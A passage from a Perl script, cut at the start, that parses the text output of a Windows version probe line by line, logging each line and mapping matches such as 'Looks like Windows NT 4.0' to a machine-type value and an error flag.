				$MachineType = $ws2003;
			}
			elsif($line =~ /Looks like either Windows XP or Windows Server 2003/) {
				$MachineType = $wxp;
			}
		}
	}
	elsif( $probeType eq "1" ) {	

		while(<$handle>) {
			chomp($line = $_);
			&EU_Log(1, $line);

			if($line =~ /ERROR/) {
				$ProbeError = 1;
				$MachineType = $not;
			}
			elsif($line =~ /Looks like UNKNOWN Windows version/) {
				$MachineType = $not;
			}
			elsif($line =~ /Looks like either Windows 9x or NT 4.0/) {
				$ProbeError = 1;
				$MachineType = $w9x;
			}
			elsif($line =~ /Looks like Windows NT 4.0/) {
				$MachineType = $nt4;
			}
			elsif($line =~ /Looks like either Windows 2000 or Windows XP/) {
				$MachineType = $w2k;
			}
			elsif($line =~ /Looks like Windows Server 2003/) {
				$MachineType = $ws2003;
			}
		}
	}
	elsif( $probeType eq "2" ) {	

		while(<$handle>) {
			chomp($line = $_);
			&EU_Log(1, $line);

			if($line =~ /ERROR/) {
				$ProbeError = 1;
				$MachineType = $not;
			}
			elsif($line =~ /Looks like UNKNOWN Windows version/) {
				$MachineType = $not;
			}
			elsif($line =~ /Looks like Beta Windows Server 2003/) {
				$MachineType = $not;
			}
			elsif($line =~ /Looks like Windows XP Professional or Home Edition/) {
				$MachineType = $wxp;
			}
			elsif($line =~ /Looks like Windows Server 2003/) {
				$MachineType = $ws2003;
			}
		}
	}
	return ($MachineType,$ProbeError); 
}



__END__



